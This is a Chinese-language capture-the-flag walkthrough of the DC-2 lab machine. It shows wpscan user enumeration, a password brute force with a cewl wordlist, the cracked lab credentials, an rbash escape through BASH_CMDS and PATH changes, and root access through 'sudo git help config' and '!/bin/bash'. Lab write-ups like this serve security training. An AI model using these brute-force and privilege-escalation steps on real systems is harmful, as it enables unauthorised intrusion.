> 环境

- Kali Linux
- DC-2靶场

---



## 信息收集

> **扫描主机**

![image-20240405100321900](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240405100321900.png)

通过主机存活扫描，我们得到dc-2的主机ip

> **扫描端口**

![image-20240405100800679](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240405100800679.png)

通过端口扫描，我们得到 80和7744端口，80端口运行的服务为httpd，7744端口运行的服务为ssh

> **访问服务**

可以尝试访问一下httpd服务，我们发现访问失败。

![image-20240405105157904](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240405105157904.png)

在使用AWVS扫描后发现，该ip有多个主机，考虑是目标主机可能配置了多个虚拟主机，而我们访问的 URL 需要与其中一个虚拟主机的域名匹配。所以我们可以在 hosts 文件中添加正确的映射，帮助访问到正确的虚拟主机。

![image-20240405110826179](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240405110826179.png)

![image-20240405105516304](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240405105516304.png)

添加映射后，再次尝试访问

![image-20240405110652132](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240405110652132.png)



可以看到，此时我们拿到了第一个Flag。该Flag要求我们使用一个账户登录获取下一个Flag，并且提示我们，平常使用的密码字典可能不起作用，需要使用cewl生成的密码字典来破除。

> **目录扫描**

```
dirsearch -u http://dc-2/
```

![image-20240405111935262](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240405111935262.png)

![image-20240405112002674](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240405112002674.png)

不难看出，`dc-2/wp-admin/`是后台管理登录页；

---



## 漏洞发现

> **根据提示使用cewl生成密码字典**
>
> - cewl是一个网络安全工具，通常用于获取目标网站的自定义字典或密码破解攻击中的关键字。它是一个命令行工具，可以从指定的网页或整个网站中提取有意义的单词，并生成一个字典文件，用于后续的密码破解或社会工程学攻击。

```
cewl http://dc-2 > dc_2_pass.dic
```

![image-20240405112631120](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240405112631120.png)

---

> **使用专扫wordpress用户的wpscan漏洞扫描工具枚举用户**
>
> `vt`: 扫描WordPress主题的漏洞；
>
> `vp`: 扫描WordPress插件的漏洞;`u`: 枚举WordPress网站的用户信息。
>
> `--plugins-detection mixed`将使用混合模式进行插件扫描

```
wpscan --url http://dc-2 -e vt,vp,u --plugins-detection mixed
```

![image-20240405113112505](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240405113112505.png)

将其保存到文件中

![image-20240405113230565](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240405113230565.png)

如此，我们就构建出密码文本和用户文本

---

> **密码暴破**

使用 wpscan进行密码暴破

```
wpscan --url http://dc-2 -U dc_2_username.dic -P dc_2_password.dic 
```

![image-20240405113900726](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240405113900726.png)

暴破后得到两个可用的账号和密码：

```
[SUCCESS] - jerry / adipiscing                                                                                                                             
[SUCCESS] - tom / parturient   
```

---



## 漏洞利用

尝试登录jerry用户

![image-20240405114417199](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240405114417199.png)

拿到flag2，提示如果我们不能利用WordPress并采取快捷方式，还有另一种方法。希望你能找到另一个切入点。

退出jerry登录后，再登录tom，发现没有找到新的Flag，再结合flag2的提示，看来我们需要更近一步；

---

尝试使用ssh登录tom

![image-20240405115221723](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240405115221723.png)

我们发现，虽然成功登录，但我们被权限锁死了，`rbash`是一种安全策略，限制了用户在shell中执行的一些功能和操作;

通过尝试，我发现vi命令可以执行，于是顺利读取到flag3

![image-20240405120311737](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240405120311737.png)

flag3的提示大意是让我们通过su切换到jerry用户，继续寻找；

由于已经被rbash限制了，所以我们需要进行绕过才能执行su；

---

### rbash绕过

通过设置shell来绕过rbash

```
BASH_CMDS[sh]=/bin/bash
```

![image-20240405120739605](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240405120739605.png)

此时前面的rbash已经变成了r，但还是切换不到，这是因为我们还没添加环境变量

```
export PATH=$PATH:/bin/
export PATH=$PATH:/usr/bin/
```

![image-20240405120822711](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240405120822711.png)

可以看到，切换成功；

![image-20240405121044560](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240405121044560.png)

该flag4要求我们还需要获得最终的flag，并且提示我们可以使用git提权；

---

### 权限提升

查看以root身份执行的命令

```
sudo -l
```

![image-20240405123333754](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240405123333754.png)

发现确实有git，直接输入命令

```
sudo git help config

!/bin/bash
```

![image-20240405123441017](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240405123441017.png)

回车，成功拿到root，最后我们cd到root目录，查看final-flag

![image-20240405123655501](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240405123655501.png)

至此，渗透测试结束

---











